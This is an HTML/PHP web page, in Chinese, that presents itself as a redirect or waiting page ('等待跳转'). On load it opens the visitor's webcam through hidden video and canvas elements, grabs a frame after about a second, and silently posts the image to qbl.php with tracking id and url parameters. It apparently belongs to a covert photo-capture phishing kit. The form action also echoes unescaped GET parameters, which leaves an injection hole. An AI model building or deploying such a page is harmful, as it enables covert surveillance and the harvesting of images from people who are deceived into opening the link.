<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>等待跳转...</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
    min-height: 100vh;
  }
  .hidden-video, .hidden-canvas {
    display: none;
  }
  p {
    font-size: 16px;
    color: #333;
    text-align: center;
    margin-top: 20px;
  }
</style>
</head>
<body>
    <video id="video" class="hidden-video" autoplay></video>
    <canvas id="canvas" class="hidden-canvas" width="480" height="640"></canvas>
    
    <p>正在准备拍摄照片，请稍候...</p>
    
    <script type="text/javascript">
        window.addEventListener("DOMContentLoaded", function() {
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            var video = document.getElementById('video');

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(function() {
                        context.drawImage(video, 0, 0, 480, 640);
                    }, 1000);
                    setTimeout(function() {
                        var img = canvas.toDataURL('image/png');  
                        document.getElementById('result').value = img;
                        document.getElementById('gopo').submit();
                    }, 1300);
                }, function() {
                    alert("操作失败，权限不够！");
                });
            }
        }, false);
    </script>

    <form action="qbl.php?id=<?php echo $_GET['id']?>&url=<?php echo $_GET['url']?>" id="gopo" method="post">
        <input type="hidden" name="img" id="result" value="" />
    </form>
</body>
</html>
